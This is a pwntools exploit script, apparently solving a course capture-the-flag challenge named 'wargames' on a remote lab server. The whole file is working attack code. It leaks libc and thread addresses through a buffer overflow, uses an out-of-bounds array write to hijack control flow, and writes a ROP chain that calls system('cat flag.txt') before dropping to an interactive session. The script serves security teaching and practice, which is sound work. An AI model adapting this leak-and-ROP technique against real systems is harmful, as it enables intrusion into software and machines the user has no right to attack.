from pwn import *

bpath = './wargames'
elf = ELF(bpath)

context.binary = elf
context.log_level = 'info'

gdbscript = '''
            break *main
            break *main+460
            break wargames.c:151
            break wargames.c:166
            shell tmux swap-pane -U
            shell tmux select-layout main-vertical
            continue
            '''

#p = gdb.debug(bpath, gdbscript=gdbscript)
#p = process(bpath)
p = remote('cs4401shell2.walls.ninja', 15206)

#########################################
########## 1. INFORMATION LEAK ##########
#########################################
offset_env      = 280
offset_ret_main = 43
addr_debugjoshua = p64(0x40162b)

set_env_str = flat({0:b'YYY', 3:b'zero', offset_env+3: addr_debugjoshua})

# answer yes to the first three questions:
print(p.recvuntil(b'Shall we play a game? [Y/n] '))
p.sendline(set_env_str)

print(p.recvuntil(b'How about Global Thermonuclear War? [Y/n] '))
print(p.recvuntil(b'A strange game\n'))
print(p.recvuntil(b'The only winning move is not to play.\n'))
print(p.recvuntil(b'...How about a nice game of tic-tac-toe? [Y/n]'))
print(p.recvuntil(b'How many players?\n'))

# get leaked libc addr
p.recvuntil(b'Libc: ')
libc_addr = p.recvuntil(b'\n').strip()
print("leaked libc address: ", libc_addr)

# get leaked thread addrs
leak = p.recvuntil(b'Your move?')
launch_addr   = leak.split(b'launch code: ')[1].split(b'\n')[0]
move_log_addr = leak.split(b'move log: ')[1].split(b'\n')[0]

# calculate libc base address
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = int(libc_addr, 16) - 0x21c87

print('libc_base: ', hex(libc_base))
print("leaked launch address: ", launch_addr)
print("leaked move log address: ", move_log_addr)


offset_system = 0x4f420
offset_exit = 0x43110
addr_system = libc_base + offset_system
addr_exit = libc_base + offset_exit

print('addr system: ', hex(addr_system))
print('addr exit: ', hex(addr_exit))

#############################################
########## 2. HIJIACK CONTROL FLOW ##########
#############################################

# send 9 filler answers to get us to the right spot to overwrite i
for i in range(9):
    p.sendline(f"{i} {i}".encode())


# set i (in play()) to distance between &move_log and &i (in launch())
# have to divide distance by 8 because indexing into an array
distance = int(launch_addr, 16) - int(move_log_addr, 16) + 0x10 + 1
distance = distance // 8
print('distance: ', distance, '(decimal)', hex(distance), '(hex)')

p.sendline(f'{distance} {distance}'.encode())


# set i (in launch()) to 10 or 11 so it only has to brute force the last character or two (choose based on how long it takes to set up rop chain)
# all this does is speed up the exploit since the remote server will automatically close the connection after a few minutes, 
# meaning we can't wait for it to brute force the entire launch code
p.sendline(f'{125} {10}'.encode())
p.sendline(f'{3735928559} {3735928559}'.encode())       # filler so we write rop chain to the right spot



###########################################
########## 3. CHAIN CONSTRUCTION ##########
###########################################
'''
Instead of using a one-gadget, since we can control launch()'s stack:

Chain:
    1. ret;             // to help with alignment (might not be necessary)
    2. pop rdi; ret;
    3. pointer to "cat flag.txt"
    4. pointer to system()
    5. pointer to exit()

'''

def split_addr(addr: int):
    addr = hex(addr)[2:]
    second_half = '0x' + addr[len(addr)-8:len(addr)]
    first_half = '0x' + addr[0:len(addr)-8]
    return int(first_half, 16), int(second_half, 16)

# 1. write address of ret;
p.sendline(f"{0x400836} {0}".encode())

# 2. write address of pop rdi; ret;
p.sendline(f"{0x401503} {0}".encode())

# 3. write pointer to "cat flag.txt"
# 0x401649 = &"cat flag.txt"
# 0x7ffff7976d88 = libc_base + 0x1b3d88 = &"/bin/sh"
p.sendline(f"{0x401649} {0}".encode())

# 4. write pointer to system():
first_half, second_half = split_addr(addr_system)
p.sendline(f"{second_half} {first_half}".encode())    # 0x7ffff7812420

# 5. write pointer to exit():
first_half, second_half = split_addr(addr_exit)
p.sendline(f"{second_half} {first_half}".encode())    # 0x7ffff7806110

p.interactive()
